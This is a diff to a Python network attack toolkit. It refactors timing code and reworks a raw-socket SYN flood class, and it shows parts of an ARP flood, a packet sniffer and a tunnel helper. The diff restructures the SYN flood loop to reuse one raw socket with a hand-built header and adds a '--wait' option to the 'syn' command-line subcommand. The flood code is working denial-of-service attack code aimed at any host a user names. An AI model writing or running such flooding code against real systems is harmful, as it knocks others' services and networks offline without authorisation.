@@ -17,7 +17,7 @@ import os
 class Constant :
     MODULE : bool = __name__ != "__main__"
     ISROOT : bool = os.geteuid() == 0
-    TIME : int = lambda : round(time.time())
+    TIME : float = lambda : time.time()
     ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
     IFACES : list = [iface[-1] for iface in socket.if_nameindex()]
     COUNTER : int = ctypes.c_uint64
@@ -733,7 +733,7 @@ class Sniff :
         return
 
     async def create_file(self) -> "file" :
-        path = f"captured_{Constant.TIME()}.txt"
+        path = f"captured_{round(Constant.TIME())}.txt"
         mode = "a" if os.path.exists(path) else "x"
         file = open(path, mode)
         Constant.FILES.append(file)
@@ -1245,7 +1245,10 @@ class DoS_Arp :
             self.hattype,
             self.dstmac
             )
-        print("preparing AF_PACKET socket... ", end = str(), flush = True)
+        print("starting timer...", end = " ", flush = True)
+        start_time = Constant.TIME()
+        print(Constant.GREEN("DONE"))
+        print("preparing AF_PACKET socket...", end = " ", flush = True)
         with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as flood :
             flood.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
             print(Constant.GREEN("DONE"))
@@ -1257,18 +1260,19 @@ class DoS_Arp :
                 if (self.num != -1) : self.progress_bar(self.load_bar, self.count, self.num)
                 time.sleep(self.wait)
             else :
-                end_time = round((time.time() - Constant.TIME()), 2)
+                end_time = round((time.time() - start_time), 2)
                 print("\n[" + Constant.GREEN("+") + "]" + " " + "ARP Requests datagrams have been sent")
                 print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
         return
 
 
 class DoS_SYN :
-    def __init__(self, host : str, port : int, count : int, rand_port : bool) -> None :
+    def __init__(self, host : str, port : int, count : int, rand_port : bool, wait : float) -> None :
         self.host = host
         self._port = self.port = port
         self.count = count
         self.rand_port = rand_port
+        self.wait = wait
         self.source = Constant.SOURCE()
         self.__counter = Constant.COUNTER(0)
         return
@@ -1380,20 +1384,27 @@ class DoS_SYN :
         return
 
     def __flood(self) -> None :
-        while (self.counter != self.count) :
-            payload = self.package()
-            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
-                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                flood.connect((self.host, self.port))
+        payload = self.package()
+        print("starting timer...", end = " ", flush = True)
+        start_time = Constant.TIME()
+        print(Constant.GREEN("DONE"))
+        print("preparing AF_INET socket...", end = " ", flush = True)
+        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
+            flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            flood.connect((self.host, self.port))
+            print(Constant.GREEN("DONE"))
+            print("flooding started...")
+            while (self.counter != self.count) :
                 flood.sendto(payload, (self.host, self.port))
-                flood.shutdown(socket.SHUT_RDWR)
-            self.counter += 1
-            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(self.counter, self.count)}" + " " + f"[{self.counter}/{self.count}]"
-            print(text, end = "\r", flush = True)
-        else :
-            end_time = round((time.time() - Constant.TIME()), 2)
-            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have been sent")
-            print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
+                flood.shutdown(socket.SHUT_RD)
+                self.counter += 1
+                text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(self.counter, self.count)}" + " " + f"[{self.counter}/{self.count}]"
+                print(text, end = "\r", flush = True)
+                time.sleep(self.wait)
+            else :
+                end_time = round((time.time() - start_time), 2)
+                print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have been sent")
+                print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
         return
 
 
@@ -1504,8 +1515,8 @@ class Tunnel :
     def get_name(headers : dict) -> str :
         keyword = "name"
         if (keyword in headers) and (headers[keyword]) :
-            return headers[keyword] + f"_{Constant.TIME()}"  + ".tmp"
-        else : return f"new_{Constant.TIME()}.tmp"
+            return headers[keyword] + f"_{round(Constant.TIME())}"  + ".tmp"
+        else : return f"new_{round(Constant.TIME())}.tmp"
 
     @staticmethod
     def get_length(headers : dict) -> int :
@@ -1686,6 +1697,7 @@ if not Constant.MODULE :
         syn_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding", default = 80)
         syn_tool.add_argument("-n", "--number", type = int, required = True, help = "sets number of packets")
         syn_tool.add_argument("-r", "--random-port", action = "store_true", help = "enables random ports")
+        syn_tool.add_argument("-w", "--wait", type = float, help = "sets time.sleep after each segment", default = 0.0)
         syn_tool.set_defaults(func = DoS_SYN_args)
         http_tool = subparser.add_parser("http", help = "execute http request")
         http_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for http request")
@@ -1810,7 +1822,8 @@ if not Constant.MODULE :
             socket.gethostbyname(args.host),
             args.port,
             args.number,
-            args.random_port
+            args.random_port,
+            args.wait
             )
         flood.flood()
         return
